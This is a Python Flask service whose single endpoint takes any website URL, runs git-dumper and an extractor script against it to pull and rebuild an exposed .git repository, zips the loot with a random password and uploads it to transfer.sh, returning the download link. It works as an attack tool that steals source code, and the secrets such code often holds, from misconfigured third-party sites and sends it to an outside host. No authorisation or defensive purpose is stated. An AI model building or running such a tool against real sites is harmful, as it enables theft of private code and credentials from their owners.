import os
import shutil
import subprocess
import tempfile
import random
import string
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
def generate_random_string(length):
    """Generate a random string of alphanumeric characters."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_git_contents(url):
    """Download .git contents from the specified URL."""
    try:
        temp_dir = tempfile.mkdtemp()
        subprocess.run(['git-dumper', url, temp_dir])
        
        # Execute the extractor.sh script after git-dumper
        subprocess.run(['bash', 'extractor.sh', temp_dir, temp_dir])
        
        git_folder_path = os.path.join(temp_dir, '.git')
        if os.path.exists(git_folder_path):
            return temp_dir
        else:
            shutil.rmtree(temp_dir)  # Clean up if .git folder is not found
            return None
    except Exception as e:
        return None

        


def create_zip_with_password(folder_path):
    """Create a zip file of the folder with a random password."""
    zip_filename = tempfile.mktemp(suffix='.zip')
    password = generate_random_string(12)
    subprocess.run(['zip', '-r', '-P', password, zip_filename, folder_path])
    return zip_filename, password

def upload_to_transfer_sh(zip_file):
    """Upload the zip file to transfer.sh."""
    try:
        response = requests.post('https://transfer.sh/', files={'file': open(zip_file, 'rb')})
        if response.status_code == 200:
            return response.text.strip()  # Return the URL provided by transfer.sh
        else:
            return None  # If the upload fails, return None
    except Exception as e:
        print("Error uploading file to transfer.sh:", e)
        return None

def process_url(url):
    """Process the URL and return password, download link, and status."""
    try:
        # Step 1: Download .git contents
        temp_dir = download_git_contents(url)

        # Step 2: Create a zip file with a random password
        zip_file, password = create_zip_with_password(temp_dir)

        # Step 3: Upload the zip file to transfer.sh
        download_link = upload_to_transfer_sh(zip_file)

        # Step 4: Cleanup temporary files
        shutil.rmtree(temp_dir)
        os.remove(zip_file)

        return {'password': password, 'download': download_link, 'status': 'success'}
    except Exception as e:
        # If any step fails, cleanup temporary files before returning
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        if zip_file and os.path.exists(zip_file):
            os.remove(zip_file)
        return {'password': None, 'download': None, 'status': 'fail'}
@app.route('/process_git_url', methods=['GET'])
def process_git_url():
    """Endpoint to process the provided git URL."""
    git_url = request.args.get('url')
    if git_url:
        result = process_url(git_url)
        return jsonify(result)
    else:
        return jsonify({'error': 'No URL provided'})

if __name__ == '__main__':
    app.run(debug=True)